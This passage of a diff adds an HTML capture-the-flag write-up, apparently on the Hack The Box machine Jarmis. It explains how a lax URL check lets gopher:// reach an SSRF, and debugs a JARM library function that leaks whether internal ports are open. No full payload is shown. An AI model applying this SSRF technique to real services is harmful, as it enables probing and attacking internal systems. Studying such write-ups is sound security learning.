+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">mount</span><span class="p">(</span><span class="sh">"</span><span class="s">gopher:</span><span class="sh">"</span><span class="p">,</span> <span class="nc">GopherAdapter</span><span class="p">())</span>
+    <span class="n">bad_headers</span> <span class="o">=</span> <span class="p">[</span> <span class="sh">"</span><span class="s">gophish</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Apache</span><span class="sh">"</span> <span class="p">]</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">update</span><span class="p">({</span> <span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">curl/7.74.0</span><span class="sh">'</span> <span class="p">})</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">https://</span><span class="sh">'</span> <span class="o">+</span> <span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="k">assert</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">bad_headers</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">str</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">headers</span><span class="p">):</span>
+                <span class="n">malicious</span> <span class="o">=</span> <span class="mi">1</span>
+        <span class="k">return</span> <span class="n">resp</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">server</span><span class="sh">'</span><span class="p">],</span> <span class="n">malicious</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sh">""</span><span class="p">,</span> <span class="mi">0</span>
+</code></pre></div></div>
+<p>But the short version is that it takes the location and makes a GET request.</p>
+<h4 id="gopher-1">Gopher</h4>
+<p>The <code class="language-plaintext highlighter-rouge">fetch</code> endpoint is meant to take an IP, domain, or URL and use it to collect a JARM signature. This shouldn’t require a protocol or any kind of path on the server. If <code class="language-plaintext highlighter-rouge">http://</code> (or even <code class="language-plaintext highlighter-rouge">ftp://</code> or <code class="language-plaintext highlighter-rouge">gopher://</code>) is given, the site should either replace that with <code class="language-plaintext highlighter-rouge">https://</code> or return a failure. The site is coded to be rather forgiving, and it just checks if <code class="language-plaintext highlighter-rouge">//</code> is in the endpoint, and if not, it adds <code class="language-plaintext highlighter-rouge">https://</code> to the start.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="sh">'</span><span class="s">//</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">endpoint</span><span class="p">:</span>
+        <span class="n">endpoint</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https://</span><span class="sh">'</span> <span class="o">+</span> <span class="n">endpoint</span>
+</code></pre></div></div>
+<p>It’s this forgiving that allows attackers to exploit the SSRF with <code class="language-plaintext highlighter-rouge">gopher://</code>.</p>
+<h4 id="127001--localhost">127.0.0.1 != localhost</h4>
+<p>I don’t see anywhere in the code above where the <code class="language-plaintext highlighter-rouge">endpoint</code> field is set. My best guess then is that it’s set by this line:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="nf">get_jarm</span><span class="p">(</span><span class="n">o</span><span class="p">.</span><span class="n">netloc</span><span class="p">))</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">get_jarm</code> is imported at the top of the code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">app.lib.jarm</span> <span class="kn">import</span> <span class="n">get_jarm</span>
+</code></pre></div></div>
+<p>Because this app is running with <code class="language-plaintext highlighter-rouge">uvicorn</code>, it’s not easy to just add <code class="language-plaintext highlighter-rouge">pdb</code> statements and debug. Still, I can play with <code class="language-plaintext highlighter-rouge">get_jarm</code> on my own. I’ll start a Python terminal and import <code class="language-plaintext highlighter-rouge">urlparse</code> and <code class="language-plaintext highlighter-rouge">get_jarm</code> (note that I’m running from <code class="language-plaintext highlighter-rouge">/opt/app</code> so the relative imports work):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@Jarmis:/opt/app#</span><span class="w"> </span><span class="n">python3</span>
+<span class="go">Python 3.8.10 (default, Jun  2 2021, 10:49:15)
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">from</span> <span class="n">app.lib.jarm</span> <span class="kn">import</span> <span class="n">get_jarm</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">urlparse([input]).netloc</code> is what is passed to <code class="language-plaintext highlighter-rouge">get_jarm</code>. That’s just the hostname and port:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">urlparse</span><span class="p">(</span><span class="sh">'</span><span class="s">https://localhost:21</span><span class="sh">'</span><span class="p">).</span><span class="n">netloc</span>
+<span class="go">'localhost:21'
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">urlparse</span><span class="p">(</span><span class="sh">'</span><span class="s">gopher://localhost:21</span><span class="sh">'</span><span class="p">).</span><span class="n">netloc</span>
+<span class="go">'localhost:21'
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">urlparse</span><span class="p">(</span><span class="sh">'</span><span class="s">http://127.0.0.1:21</span><span class="sh">'</span><span class="p">).</span><span class="n">netloc</span>
+<span class="go">'127.0.0.1:21'
+</span></code></pre></div></div>
+<p>When I try localhost on TCP 21 (which is closed), it gives errors and then returns a JSON string:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">get_jarm</span><span class="p">(</span><span class="nf">urlparse</span><span class="p">(</span><span class="sh">'</span><span class="s">https://localhost:21</span><span class="sh">'</span><span class="p">).</span><span class="n">netloc</span><span class="p">)</span>
+<span class="go">[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+'{"note": "localhost", "endpoint": "null", "sig": "00000000000000000000000000000000000000000000000000000000000000"}'
+</span></code></pre></div></div>
+<p>The same thing happens with 127.0.0.1, but it includes the <code class="language-plaintext highlighter-rouge">endpoint</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">get_jarm</span><span class="p">(</span><span class="nf">urlparse</span><span class="p">(</span><span class="sh">'</span><span class="s">https://127.0.0.1:21</span><span class="sh">'</span><span class="p">).</span><span class="n">netloc</span><span class="p">)</span>
+<span class="go">[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+[Errno 111] Connection refused
+'{"note": "127.0.0.1", "endpoint": "127.0.0.1:21", "sig": "00000000000000000000000000000000000000000000000000000000000000"}'
+</span></code></pre></div></div>
+<p>At this point I can safely say the issue is in the <code class="language-plaintext highlighter-rouge">get_jarm</code> function. As far as I can tell, this is pulled directly from <a href="https://github.com/salesforce/jarm/blob/master/jarm.py">GitHub</a>.</p>
+<p>The returned JSON is built at the end of the function:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">result</span> <span class="o">=</span> <span class="nf">jarm_hash</span><span class="p">(</span><span class="n">jarm</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">note</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">destination_host</span>
+    <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">endpoint</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">null</span><span class="sh">"</span>
+    <span class="k">if</span> <span class="n">ip</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">endpoint</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">destination_port</span><span class="si">}</span><span class="sh">'</span>
+    <span class="n">data</span><span class="p">[</span><span class="sh">'</span><span class="s">sig</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span>
+    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div></div>
+<p>So I need to find where the <code class="language-plaintext highlighter-rouge">ip</code> variable is set, which is the return from <code class="language-plaintext highlighter-rouge">send_packet</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">server_hello</span><span class="p">,</span> <span class="n">ip</span> <span class="o">=</span> <span class="nf">send_packet</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">destination_host</span><span class="p">,</span> <span class="n">destination_port</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I’ve included that full function here, with line numbers:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">256</span> <span class="k">def</span> <span class="nf">send_packet</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">destination_host</span><span class="p">,</span> <span class="n">destination_port</span><span class="p">):</span>
+<span class="mi">257</span>     <span class="k">try</span><span class="p">:</span>
+<span class="mi">258</span>         <span class="c1">#Determine if the input is an IP or domain name
+</span><span class="mi">259</span>         <span class="k">try</span><span class="p">:</span>
+<span class="mi">260</span>             <span class="nf">if </span><span class="p">(</span><span class="nf">type</span><span class="p">(</span><span class="n">ipaddress</span><span class="p">.</span><span class="nf">ip_address</span><span class="p">(</span><span class="n">destination_host</span><span class="p">))</span> <span class="o">==</span> <span class="n">ipaddress</span><span class="p">.</span><span class="n">IPv4Address</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="nf">type</span><span class="p">(</span><span class="n">ipaddress</span><span class="p">.</span><span class="nf">ip_address</span><span class="p">(</span><span class="n">destination_host</span><span class="p">))</span> <span class="o">==</span> <span class="n">ipaddress</span><span class="p">.</span><span class="n">IPv6Address</span><span class="p">):</span>
+<span class="mi">261</span>                 <span class="n">raw_ip</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="mi">262</span>                 <span class="n">ip</span> <span class="o">=</span> <span class="p">(</span><span class="n">destination_host</span><span class="p">,</span> <span class="n">destination_port</span><span class="p">)</span>
+<span class="mi">263</span>         <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+<span class="mi">264</span>                 <span class="n">ip</span> <span class="o">=</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+<span class="mi">265</span>                 <span class="n">raw_ip</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="mi">266</span>         <span class="c1">#Connect the socket
+</span><span class="mi">267</span>         <span class="k">if</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">destination_host</span><span class="p">:</span>
+<span class="mi">268</span>             <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="mi">269</span>             <span class="c1">#Timeout of 20 seconds
+</span><span class="mi">270</span>             <span class="n">sock</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+<span class="mi">271</span>             <span class="n">sock</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">destination_host</span><span class="p">,</span> <span class="n">destination_port</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+<span class="mi">272</span>         <span class="k">else</span><span class="p">:</span>
+<span class="mi">273</span>             <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="mi">274</span>             <span class="c1">#Timeout of 20 seconds
+</span><span class="mi">275</span>             <span class="n">sock</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+<span class="mi">276</span>             <span class="n">sock</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">destination_host</span><span class="p">,</span> <span class="n">destination_port</span><span class="p">))</span>
+<span class="mi">277</span>         <span class="c1">#Resolve IP if given a domain name
+</span><span class="mi">278</span>         <span class="k">if</span> <span class="n">raw_ip</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+<span class="mi">279</span>             <span class="n">ip</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">getpeername</span><span class="p">()</span>
+<span class="mi">280</span>         <span class="n">sock</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+<span class="mi">281</span>         <span class="c1">#Receive server hello
+</span><span class="mi">282</span>         <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1484</span><span class="p">)</span>
+<span class="mi">283</span>         <span class="c1">#Close socket
+</span><span class="mi">284</span>         <span class="n">sock</span><span class="p">.</span><span class="nf">shutdown</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SHUT_RDWR</span><span class="p">)</span>
+<span class="mi">285</span>         <span class="n">sock</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+<span class="mi">286</span>         <span class="k">return</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">ip</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="mi">287</span>     <span class="c1">#Timeout errors result in an empty hash
+</span><span class="mi">288</span>     <span class="k">except</span> <span class="n">socket</span><span class="p">.</span><span class="n">timeout</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+<span class="mi">289</span>         <span class="n">sock</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+<span class="mi">290</span>         <span class="k">return</span> <span class="sh">"</span><span class="s">TIMEOUT</span><span class="sh">"</span><span class="p">,</span> <span class="n">ip</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="mi">291</span>     <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+<span class="mi">292</span>         <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+<span class="mi">293</span>         <span class="n">sock</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+<span class="mi">294</span>         <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="n">ip</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</code></pre></div></div>
+<p>If an IP is passed in as <code class="language-plaintext highlighter-rouge">destination_host</code>, it is set to <code class="language-plaintext highlighter-rouge">ip[0]</code> right at the top, and then that’s what comes back.</p>
+<p>If a domain name is passed (like localhost), <code class="language-plaintext highlighter-rouge">ip</code> is set to <code class="language-plaintext highlighter-rouge">(None, None)</code>. Later in the code, at line 279, the IP is updated by <code class="language-plaintext highlighter-rouge">sock.getpeername()</code>, which does a DNS call for the domain and returns the IP. The bug here is that if the socket fails to connect at line 271 (or line 276), then it throws a <code class="language-plaintext highlighter-rouge">socket.timeout</code> exception, which is caught down at 288. It then returns “TIMEOUT” and <code class="language-plaintext highlighter-rouge">ip[0]</code>, which is still None.</p>
+<p>That explains how it returns differently if the socket is open or not.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/09/27/htb-jarmis.html"></a>
+</article>
